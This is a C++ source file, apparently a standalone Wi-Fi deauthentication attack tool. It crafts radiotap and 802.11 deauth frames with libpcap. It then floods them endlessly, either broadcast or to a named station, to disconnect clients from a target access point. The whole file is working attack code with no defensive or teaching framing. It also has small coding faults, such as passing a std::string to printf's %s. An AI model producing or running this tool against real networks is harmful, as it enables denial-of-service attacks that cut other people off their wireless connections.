#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <pcap.h>
#include "mac.h"

#pragma pack(push, 1)

struct RadiotapHdr {
    uint8_t  revision;
    uint8_t  pad;
    uint16_t len;
    uint32_t present;
} rth_;

struct DeauthFrame {
    uint16_t frameControl;
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seqNum;
    uint16_t reasonCode;
};
typedef DeauthFrame* PDeauthFrame;

#pragma pack(pop)

void initRadiotap(RadiotapHdr* rt) {
    memset(rt, 0, sizeof(rth_));
    rt->len = sizeof(rth_);
}

void initDeauthFrame(DeauthFrame* frm, const Mac& addr1, const Mac& addr2, const Mac& bssid) {
    memset(frm, 0, sizeof(DeauthFrame));
    frm->frameControl = 0x00C0;
    memcpy(frm->addr1, addr1.mac_, 6);
    memcpy(frm->addr2, addr2.mac_, 6);
    memcpy(frm->addr3, bssid.mac_, 6);
    frm->reasonCode = 0x0007;
}

void sendDeauth(pcap_t* handle, const Mac& addr1, const Mac& addr2, const Mac& bssid) {
    uint8_t buf[sizeof(rth_) + sizeof(DeauthFrame)];

    RadiotapHdr rt;
    initRadiotap(&rt);

    DeauthFrame frm;
    initDeauthFrame(&frm, addr1, addr2, bssid);

    memcpy(buf, &rt, sizeof(rt));
    memcpy(buf + sizeof(rt), &frm, sizeof(frm));

    if (pcap_sendpacket(handle, buf, sizeof(buf)) != 0)
        fprintf(stderr, "sendpacket error: %s\n", pcap_geterr(handle));
}

pcap_t* openHandle(const std::string& iface) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface.data(), BUFSIZ, 1, 1, errbuf);
    if (!handle)
        fprintf(stderr, "pcap_open_live(%s): %s\n", iface.data(), errbuf);
    return handle;
}

struct Args {
    std::string iface;
    Mac apMac;
    Mac staMac;
    bool hasStation;
} args_;

bool parseArgs(int argc, char* argv[]) {
    if (argc < 3) return false;

    args_.iface      = argv[1];
    args_.apMac      = Mac(argv[2]);
    args_.hasStation  = false;

    if (argc >= 4) {
        args_.staMac     = Mac(argv[3]);
        args_.hasStation = true;
    }
    return true;
}

void printInfo() {
    printf("AP : %s\n", args_.apMac.toString().data());
    if (args_.hasStation)
        printf("STA : %s\n", args_.staMac.toString().data());
    printf("Iface : %s\n\n", args_.iface);
}

void sendBroadcast(pcap_t* handle, const Mac& apMac) {
    Mac bcast;
    memset(bcast.mac_, 0xFF, 6);
    sendDeauth(handle, bcast, apMac, apMac);
}

void sendUnicast(pcap_t* handle, const Mac& apMac, const Mac& staMac) {
    sendDeauth(handle, staMac, apMac, apMac);
    sendDeauth(handle, apMac, staMac, apMac);
}

void attackLoop(pcap_t* handle) {
    int count =0;
    while (true) {
        
        if (!args_.hasStation)
            sendBroadcast(handle, args_.apMac);
        else
            sendUnicast(handle, args_.apMac, args_.staMac);

        count++;
        printf("\r[*] Sent %d deauth packets...", count);
        
        usleep(100000);
    }
}

void usage(const char* prog) {
    fprintf(stderr,
        "syntax : %s <interface> <ap mac> [<station mac>]\n"
        "sample : %s mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n", prog, prog);
}

int main(int argc, char* argv[]) {
    if (!parseArgs(argc, argv)) {
        usage(argv[0]);
        return 1;
    }

    pcap_t* handle = openHandle(args_.iface);
    if (!handle) return 1;

    printInfo();
    attackLoop(handle);

    pcap_close(handle);
    return 0;
}
